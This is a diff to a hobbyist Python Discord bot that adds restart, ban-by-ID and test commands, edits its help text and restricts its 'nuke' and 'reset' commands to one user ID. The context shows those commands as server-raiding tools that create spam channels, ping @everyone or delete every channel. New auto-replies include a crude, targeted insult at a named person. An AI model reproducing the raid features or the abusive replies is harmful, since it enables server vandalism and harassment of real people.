@@ -7,6 +7,7 @@ from instaloader import Instaloader, Profile
 from discord import Embed
 from discord import Spotify
 import wikipedia
+import sys
 
 
 #-----Intents-----
@@ -25,7 +26,19 @@ client.remove_command('help')
 
 #-----Events triggered n shi-----
 
+@client.command()
+async def restart(ctx):
+  await ctx.send("Restarting...")
+  os.system('python main.py')
+  sys.exit()
+  
 
+
+@client.command()
+async def test(ctx):
+  await ctx.send("this is a test")
+
+  
 @client.command()
 async def wiki(ctx, name):
   name = "'" + name + "'"
@@ -39,7 +52,7 @@ async def on_ready():
 
 def has_numbers(inputString):
   return any(char.isdigit() for char in inputString)
-
+  
 
 @client.event
 async def on_message_delete(message):
@@ -112,7 +125,7 @@ async def president(ctx):
     await ctx.channel.send(embed=embed)
 
 
-@client.command()
+@client.command()  
 async def spin(ctx):
     await ctx.channel.send(
         "  https://tenor.com/view/monke-spin-spinning-monkey-spinning-monke-gif-20299211"
@@ -120,7 +133,7 @@ async def spin(ctx):
 
 
 @client.command()
-async def spam(ctx, amount: int, *, message):
+async def spam00000(ctx, amount: int, *, message):
     for i in range(amount):
         await ctx.send(message)
 
@@ -130,7 +143,7 @@ async def help(ctx):
     embed = discord.Embed(
         title="AHHHH HELP!",
         description=
-        "Commands include: \n!kick: Kick a member \n!ban: Ban a member \n!unban: Unban a member \n!mute: Mute a member \n!timeout: puts user in timeout \n!free: releases user from timeout \n!info: Print out info on the current server \n!current: Show info on current song \n!spin: spinning monke \n!delete: enable deleted message logging \n!nuke: creates channels and spams gifs \n!nuke2: deletes every channel",
+        "Commands include: \nkick: Kick a member \nban: Ban a member \nunban: Unban a member \nmute: Mute a member \ntimeout: puts user in timeout \nfree: releases user from timeout \ninfo: Print out info on the current server \ncurrent: Show info on current song \nspin: spinning monke \ndelete: enable deleted message logging \nnuke: creates channels and spams gifs and @everyone \nig: Lookup up instagram profiles",
         color=0x19B9B9)
     await ctx.channel.send(embed=embed)
 
@@ -153,6 +166,21 @@ async def ban(ctx, user: discord.Member = None, *, reason="No reason"):
     await ctx.reply("bruh ban who")
   else:
     await user.ban(reason=reason)
+    embed = discord.Embed(
+        title="Banned!",
+        description="**{0}** was banned for **'{1}'** lol fuckin loser".format(
+            user, reason),
+        color=0x19B9B9)
+    await ctx.channel.send(embed=embed)
+
+@client.command()
+@commands.has_permissions(ban_members=True)
+async def banid(ctx, id: int, *, reason="No reason"):
+  user = await client.fetch_user(id)
+  if user == None:
+    await ctx.reply("bruh ban who")
+  else:
+    await ctx.guild.ban(user,reason=reason)
     embed = discord.Embed(
         title="Banned!",
         description="**{0}** was banned for **'{1}'** lol fuckin loser".format(
@@ -248,7 +276,7 @@ async def nuke(ctx, channelnukename="bruh"):
   if ctx.guild.id == 603084195102851073:
     await ctx.channel.send("fucked up")
   else:
-    if ctx.author.id == 414931767129276428 or 289081560995463168:
+    if ctx.author.id == 414931767129276428:
         await ctx.message.delete()
         guild = ctx.guild
         count = 0
@@ -270,7 +298,7 @@ async def reset(ctx, channelnukename="bruh"):
   if ctx.guild.id == 603084195102851073:
     await ctx.channel.send("fucked up")
   else:
-    if ctx.author.id == 414931767129276428 or 289081560995463168:
+    if ctx.author.id == 414931767129276428:
         await ctx.message.delete()
         guild = ctx.guild
         for channel in guild.channels:
@@ -425,6 +453,10 @@ async def on_message(message):
             await message.reply("russian to suck dn")
         if message.content.lower() == 'dn':
             await message.reply("deez nuts")
+        if message.content.lower() == 'pull':
+            await message.reply("why don't you pull some bitches")
+        if message.content.lower() == 'james':
+            await message.reply("fat fucking white bitch whore ass fuck tard cum gobbler no hoes fat fuck musty as hell")
 
         if message.content.lower() == 'balls':
             await message.reply(
